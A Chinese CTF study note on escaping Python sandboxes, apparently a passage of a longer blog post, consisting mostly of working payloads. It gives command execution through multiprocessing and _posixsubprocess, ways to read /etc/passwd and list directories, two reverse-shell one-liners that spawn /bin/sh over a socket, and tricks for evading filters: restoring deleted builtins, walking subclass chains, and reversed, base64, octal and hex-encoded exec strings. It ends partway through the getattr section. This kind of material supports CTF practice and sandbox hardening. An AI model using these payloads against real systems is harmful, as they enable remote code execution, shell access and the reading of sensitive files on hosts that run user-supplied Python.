<h6 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h6><p><code>multiprocessing</code>是Python的一个内置模块，它支持<strong>生成进程</strong>并实现并行执行。它允许你创建新的独立于主进程的进程，这些新的进程可以在系统中并行运行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;ls&#x27;</span>) </span><br><span class="line"></span><br><span class="line">p = multiprocessing.Process(target=func) </span><br><span class="line">p.start()</span><br><span class="line"></span><br><span class="line">用于题目（差不多的，稍微根据上面改改就行）：</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br></pre></td></tr></table></figure>

<p>这个模块的工作方式和 <code>threading</code> 模块类似，但下面是一些关键区别：</p>
<ol>
<li>进程：每个进程都有自己的内存空间，因此在一个进程中进行的任何更改都不会影响其他进程。</li>
<li>线程：所有线程共享同一内存空间，因此在一个线程中进行的任何更改都可能影响其他线程。</li>
</ol>
<p>因此，实际上，你可以想象 <code>multiprocessing</code> 模块创建的进程就像是完全独立的小程序，它们在主程序的控制下运行，并且彼此之间不会互相干扰。</p>
<h6 id="posixsubprocess"><a href="#posixsubprocess" class="headerlink" title="_posixsubprocess"></a>_posixsubprocess</h6><p><code>_posixsubprocess</code> 是Python的一个内部模块，<strong>这个模块常在内部创建子进程</strong>，主要的函数是 <code>fork_exec()</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结合<code>__loader__.load_module(fullname)</code>导入模块：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).socket(<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).AF_INET,<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));[<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).dup2(s.fileno(),i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)];<span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>看上面这两个代码应该是只有<code>exec</code>能用，也许<code>eval+compile</code>也能。</p>
<h5 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h5><h6 id="file-类"><a href="#file-类" class="headerlink" title="file 类"></a>file 类</h6><p>python2有这个函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(&#x27;flag&#x27;).read()</span><br></pre></td></tr></table></figure>



<h6 id="open-函数"><a href="#open-函数" class="headerlink" title="open 函数"></a>open 函数</h6><p>还是比较常用的了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">__builtins__.<span class="built_in">open</span>(<span class="string">&#x27;etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment">#__builtins__ 一般是一个内置的模块,可以不用import引入</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;builtins&quot;</span>).<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<h6 id="codecs-模块"><a href="#codecs-模块" class="headerlink" title="codecs 模块"></a>codecs 模块</h6><p><code>codecs</code> 是Python的一个内置模块，它提供了许多在处理文本时非常有用的功能，包括文本编码&#x2F;解码，数据转换等。这个模块支持很多种文本编码，包括但不限于UTF-8, ASCII, ISO-8859-1等。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.<span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p>与内置的 <code>open()</code> 函数相比，<code>codecs.open()</code> 可以用更简便的方式处理文件中的编码问题。</p>
<h6 id="get-data-函数"><a href="#get-data-函数" class="headerlink" title="get_data 函数"></a>get_data 函数</h6><p><strong>FileLoader 类</strong>,注意找到这个类再利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].get_data(0,&quot;server.py&quot;)</span><br></pre></td></tr></table></figure>



<h6 id="linecache-模块"><a href="#linecache-模块" class="headerlink" title="linecache 模块"></a>linecache 模块</h6><p><strong>getlines 函数</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line">linecache.getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">即</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;linecache&quot;</span>).getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>getline 函数需要第二个参数指定行号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;linecache&quot;</span>).getline(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<h5 id="读目录"><a href="#读目录" class="headerlink" title="读目录"></a>读目录</h5><h6 id="os模块-1"><a href="#os模块-1" class="headerlink" title="os模块"></a>os模块</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">读取根目录文件：</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">即</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">读取当前目录的所有文件和文件夹：</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;./&#x27;</span>) </span><br></pre></td></tr></table></figure>

<h6 id="glob模块"><a href="#glob模块" class="headerlink" title="glob模块"></a>glob模块</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line">glob.glob(<span class="string">&quot;f*&quot;</span>)</span><br><span class="line">即</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;glob&#x27;</span>).glob(<span class="string">&quot;f*&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这段代码使用了Python的 <code>glob</code> 模块来匹配所有以 “f” 开头的文件名。</p>
<h5 id="获取环境信息"><a href="#获取环境信息" class="headerlink" title="获取环境信息"></a>获取环境信息</h5><h6 id="获取当前环境的属性和函数"><a href="#获取当前环境的属性和函数" class="headerlink" title="获取当前环境的属性和函数"></a>获取当前环境的属性和函数</h6><p><strong>dir()与<code>__dict__</code></strong></p>
<p>这两种方法都是一个目的，列出模组&#x2F;类&#x2F;对象 下面所有的属性和函数。这在沙盒逃逸中是很有用的,<strong>可以找到隐藏在其中的一些东西</strong>，对于这个的应用还是比较重要的，可以看看另一篇文章的calc_jail_beginner_level5(JAIL)</p>
<p><strong>dir()</strong> 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">简单看看：</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A.__dict__</span><br><span class="line">mappingproxy(&#123;<span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;asdas&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;A&#x27;</span> objects&gt;,&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(A)</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>,  ]</span><br></pre></td></tr></table></figure>

<p>同样的<code>sys.modules</code>也是可以看到已定义的全部的函数和变量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">main_module = sys.modules[__name__]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(main_module))</span><br></pre></td></tr></table></figure>



<h6 id="获取python版本"><a href="#获取python版本" class="headerlink" title="获取python版本"></a>获取python版本</h6><p><strong>sys模块</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.version</span><br></pre></td></tr></table></figure>

<p><strong>platform 模块</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.python_version()</span><br></pre></td></tr></table></figure>

<h6 id="获取linux版本"><a href="#获取linux版本" class="headerlink" title="获取linux版本"></a>获取linux版本</h6><p>platform 模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform</span><br><span class="line">platform.uname()</span><br></pre></td></tr></table></figure>

<h6 id="获取路径"><a href="#获取路径" class="headerlink" title="获取路径"></a>获取路径</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.path</span><br><span class="line">sys.modules</span><br></pre></td></tr></table></figure>

<h5 id="获取全局变量"><a href="#获取全局变量" class="headerlink" title="获取全局变量"></a>获取全局变量</h5><h6 id="global函数"><a href="#global函数" class="headerlink" title="global函数"></a>global函数</h6><p><code>globals()</code>直接用就行，可以获取所有的全局变量</p>
<h6 id="help函数-1"><a href="#help函数-1" class="headerlink" title="help函数"></a>help函数</h6><p>help函数月可以获取某个模块的帮助信息，包括全局变量，输入<code>__main__</code>之后可以获取当前模块的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help&gt;__main__</span><br></pre></td></tr></table></figure>

<p>相比 globals() 而言 help() 更短，在一些限制长度的题目中有利用过这个点。</p>
<h6 id="vars函数"><a href="#vars函数" class="headerlink" title="vars函数"></a>vars函数</h6><p><code>vars()</code>函数返回该对象的命名空间中的所有属性以字典的形式表示，当前模块的所有变量也会包含在里面，一些过滤<code>globals</code>和<code>help</code>函数的场景可以尝试使用<code>vars()</code>。</p>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="绕过删除模块或方法"><a href="#绕过删除模块或方法" class="headerlink" title="绕过删除模块或方法"></a>绕过删除模块或方法</h4><p>在一些沙箱中，可能会对某些模块或者模块的某些方法使用<code>del</code>关键字进行删除。例如删除builtins模块的eval方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="reload-重新加载"><a href="#reload-重新加载" class="headerlink" title="reload 重新加载"></a>reload 重新加载</h5><p>reload函数可以重新加载模块，这样被删除的函数就能被重新加载</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure>

<p>在 Python 3 中，reload() 函数被移动到 importlib 模块中，所以如果要使用 reload() 函数，需要先导入 importlib 模块。如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.reload(__builtins__)</span><br></pre></td></tr></table></figure>

<p>但是注意一个问题，新版的python 即使运行了 importlib.reload 也无法恢复了。</p>
<h5 id="恢复sys-modules"><a href="#恢复sys-modules" class="headerlink" title="恢复sys.modules"></a>恢复sys.modules</h5><p>一些过滤中可能将 <code>sys.modules[&#39;os&#39;]</code> 进行修改. 这个时候即使将 os 模块导入进来,也是无法使用的.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;str&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;system&#x27;</span></span><br></pre></td></tr></table></figure>

<p>由于很多别的命令执行库也使用到了 os,因此也会受到相应的影响,例如 subprocess</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;</span>, line <span class="number">688</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Popen</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  File <span class="string">&quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;</span>, line <span class="number">1708</span>, <span class="keyword">in</span> Popen</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_handle_exitstatus</span>(<span class="params">self, sts, _WIFSIGNALED=os.WIFSIGNALED,</span></span><br><span class="line"><span class="params">AttributeError: <span class="string">&#x27;str&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;WIFSIGNALED&#x27;</span></span></span><br></pre></td></tr></table></figure>

<p>由于 import 导入模块时会检查 sys.modules 中是否已经有这个类，如果有则不加载,没有则加载.因此我们只需要将 os 模块删除,然后再次导入即可.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span> <span class="comment"># oj 为你加的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>





<h5 id="基于继承链获取"><a href="#基于继承链获取" class="headerlink" title="基于继承链获取"></a>基于继承链获取</h5><p>(ssti)</p>
<p>在清空了<code>__builtins__</code>的情况下，我们也可以通过索引<code>subclasses</code>来找到这些内建函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[5]</span><br></pre></td></tr></table></figure>

<h5 id="使用globals-获取builtins方法"><a href="#使用globals-获取builtins方法" class="headerlink" title="使用globals()获取builtins方法"></a>使用globals()获取builtins方法</h5><p>在一些题目中，可能通过覆盖内置的函数来限制我们使用。例如下面的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">blacklist_fun_callback</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Player! It&#x27;s already banned!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">vars</span> = blacklist_fun_callback</span><br><span class="line">attr = blacklist_fun_callback</span><br><span class="line"><span class="built_in">dir</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">getattr</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">exec</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">__import__</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">compile</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">breakpoint</span> = blacklist_fun_callback</span><br></pre></td></tr></table></figure>

<p>但builtins 模块是一个不可变的模块对象，这样修改仅能够在当前的作用域中生效，而 globals() 中存放了 builtins 模块的索引，因此可以通过下面的方式获取到原始的方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;breakpoint&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>但如果题目如下方式删除，那么就没有办法了，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> <span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">breakpoint</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过基于字符串匹配的过滤"><a href="#绕过基于字符串匹配的过滤" class="headerlink" title="绕过基于字符串匹配的过滤"></a>绕过基于字符串匹配的过滤</h4><h5 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h5><p>类似于ssti的过滤方法，<strong>注意看下面的过滤引号那里的比如<code>bytes()函数</code>等，注意知识点串通利用</strong></p>
<h6 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;fi&#x27;</span>+<span class="string">&#x27;le&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<h6 id="逆序"><a href="#逆序" class="headerlink" title="逆序"></a>逆序</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])-这个<span class="built_in">exec</span>同样适用</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>注意 exec 与 eval 在执行上有所差异,其实就是多条命令执行的差异注意使用就行。</p>
<p>可以让解释器帮忙逆序再传进去：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code= <span class="string">&quot;import os; system(ls)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(code[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h6 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h6><p><strong>base64</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><strong>八进制编码</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>十六进制编码</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>其他应该可以去看ssti的编码绕过，rot13、base32 等</p>
<h5 id="过滤了属性名或者函数名"><a href="#过滤了属性名或者函数名" class="headerlink" title="过滤了属性名或者函数名"></a>过滤了属性名或者函数名</h5><p>在payload的构造中，京城使用了各种类中的属性，例如<code>__class__</code>、<code>__import__</code>等。</p>
<h6 id="getattr函数"><a href="#getattr函数" class="headerlink" title="getattr函数"></a>getattr函数</h6><p><code>getattr</code>是Python的内置函数，用于获取一个对象的属性或者方法。其语法如下：</p>
